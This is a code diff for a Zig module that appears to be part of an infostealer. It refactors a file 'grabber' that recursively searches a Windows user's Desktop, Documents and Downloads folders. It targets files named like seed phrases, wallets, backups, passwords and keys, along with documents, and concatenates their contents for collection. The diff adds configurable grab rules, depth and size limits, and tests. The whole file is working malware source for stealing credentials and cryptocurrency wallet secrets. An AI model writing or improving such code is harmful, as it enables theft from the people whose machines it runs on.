@@ -1,11 +1,19 @@
 const std = @import("std");
 const file_io = @import("../parsers/file_io.zig");
 
-const masks = [_][]const u8{ "*.txt", "*seed*", "*.dat", "*.wallet", "*backup*", "*.key", "*password*" };
+pub const GrabRule = struct {
+    base_dir: []const u8,
+    include_masks: []const []const u8,
+    exclude_masks: []const []const u8,
+    max_depth: u32,
+    max_file_size: usize,
+};
 
-const search_dirs = [_][]const u8{ "Desktop", "Documents", "Downloads" };
-
-const max_file_size: usize = 5 * 1024 * 1024;
+pub const DEFAULT_RULES: [3]GrabRule = .{
+    .{ .base_dir = "Desktop", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat" }, .exclude_masks = &.{}, .max_depth = 3, .max_file_size = 5 * 1024 * 1024 },
+    .{ .base_dir = "Documents", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat", "*.doc", "*.docx", "*.pdf" }, .exclude_masks = &.{}, .max_depth = 5, .max_file_size = 10 * 1024 * 1024 },
+    .{ .base_dir = "Downloads", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat", "*.doc", "*.docx" }, .exclude_masks = &.{}, .max_depth = 2, .max_file_size = 5 * 1024 * 1024 },
+};
 
 fn matchesMask(name: []const u8, mask: []const u8) bool {
     if (mask.len == 0) return name.len == 0;
@@ -21,42 +29,49 @@ fn matchesMask(name: []const u8, mask: []const u8) bool {
     return false;
 }
 
-fn matchesAnyMask(name: []const u8) bool {
-    for (masks) |mask| {
+fn matchesAnyInclude(name: []const u8, include_masks: []const []const u8) bool {
+    for (include_masks) |mask| {
         if (matchesMask(name, mask)) return true;
     }
     return false;
 }
 
-fn readFileContent(allocator: std.mem.Allocator, path: []const u8) ?[]const u8 {
+fn matchesAnyExclude(name: []const u8, exclude_masks: []const []const u8) bool {
+    for (exclude_masks) |mask| {
+        if (matchesMask(name, mask)) return true;
+    }
+    return false;
+}
+
+fn readFileContent(allocator: std.mem.Allocator, path: []const u8, max_size: usize) ?[]const u8 {
     const mapped = file_io.MappedFile.open(path) orelse {
         var file = std.fs.openFileAbsolute(path, .{}) catch return null;
-
         defer file.close();
         const size = file.getEndPos() catch return null;
-        if (size > max_file_size) return null;
-        const content = file.readToEndAlloc(allocator, max_file_size) catch return null;
+        if (size > max_size) return null;
+        const content = file.readToEndAlloc(allocator, max_size) catch return null;
         return content;
     };
     defer mapped.close();
-
     const size = mapped.size;
-    if (size > max_file_size) return null;
-
+    if (size > max_size) return null;
     return allocator.dupe(u8, mapped.slice());
 }
 
 pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
+    return collectRules(allocator, &DEFAULT_RULES);
+}
+
+pub fn collectRules(allocator: std.mem.Allocator, rules: []const GrabRule) ![]const u8 {
     const user_profile = std.process.getEnvVarOwned(allocator, "USERPROFILE") catch return error.UserProfileNotFound;
     defer allocator.free(user_profile);
 
     var result = std.ArrayList(u8).init(allocator);
     errdefer result.deinit();
-
     var file_count: usize = 0;
 
-    for (search_dirs) |dir_name| {
-        const dir_path = try std.fs.path.join(allocator, &[_][]const u8{ user_profile, dir_name });
+    for (rules) |rule| {
+        const dir_path = try std.fs.path.join(allocator, &[_][]const u8{ user_profile, rule.base_dir });
         defer allocator.free(dir_path);
 
         var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
@@ -67,12 +82,20 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
 
         while (try walker.next()) |entry| {
             if (entry.kind != .file) continue;
-            if (!matchesAnyMask(entry.basename)) continue;
+            if (rule.max_depth > 0) {
+                var depth: u32 = 0;
+                for (entry.path) |c| {
+                    if (c == '\\' or c == '/') depth += 1;
+                }
+                if (depth >= rule.max_depth) continue;
+            }
+            if (!matchesAnyInclude(entry.basename, rule.include_masks)) continue;
+            if (matchesAnyExclude(entry.basename, rule.exclude_masks)) continue;
 
             const full_path = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path });
             defer allocator.free(full_path);
 
-            const content = readFileContent(allocator, full_path) orelse continue;
+            const content = readFileContent(allocator, full_path, rule.max_file_size) orelse continue;
 
             if (file_count > 0) {
                 try result.appendSlice("\n\n--- ");
@@ -87,7 +110,6 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
             } else {
                 try result.appendSlice("[empty file]");
             }
-
             allocator.free(content);
             file_count += 1;
         }
@@ -96,7 +118,6 @@ pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
     if (file_count == 0) {
         try result.appendSlice("No matching files found");
     }
-
     return try result.toOwnedSlice();
 }
 
@@ -125,12 +146,15 @@ test "matchesMask edge cases" {
     try testing.expect(matchesMask("password.bak", "*password*"));
 }
 
-test "matchesAnyMask checks all masks" {
-    try testing.expect(matchesAnyMask("mywallet.dat"));
-    try testing.expect(matchesAnyMask("seed_phrase.txt"));
-    try testing.expect(matchesAnyMask("backup_2024.key"));
-    try testing.expect(!matchesAnyMask("innocent.jpg"));
-    try testing.expect(!matchesAnyMask("readme.md"));
+test "matchesAnyInclude checks all include masks" {
+    try testing.expect(matchesAnyInclude("mywallet.dat", &.{"*.dat"}));
+    try testing.expect(matchesAnyInclude("seed_phrase.txt", &.{"*seed*"}));
+    try testing.expect(!matchesAnyInclude("innocent.jpg", &.{"*.txt", "*.dat"}));
+}
+
+test "matchesAnyExclude works correctly" {
+    try testing.expect(matchesAnyExclude("evil.exe", &.{"*.exe"}));
+    try testing.expect(!matchesAnyExclude("good.txt", &.{"*.exe"}));
 }
 
 test "collect handles missing userprofile" {
@@ -139,6 +163,13 @@ test "collect handles missing userprofile" {
 }
 
 test "readFileContent handles nonexistent path" {
-    const content = readFileContent(testing.allocator, "C:\\__nonexistent__file__");
+    const content = readFileContent(testing.allocator, "C:\\__nonexistent__file__", 5 * 1024 * 1024);
     try testing.expect(content == null);
+}
+
+test "DEFAULT_RULES has 3 entries" {
+    try testing.expect(DEFAULT_RULES.len == 3);
+    try testing.expectEqualStrings("Desktop", DEFAULT_RULES[0].base_dir);
+    try testing.expectEqualStrings("Documents", DEFAULT_RULES[1].base_dir);
+    try testing.expectEqualStrings("Downloads", DEFAULT_RULES[2].base_dir);
 }
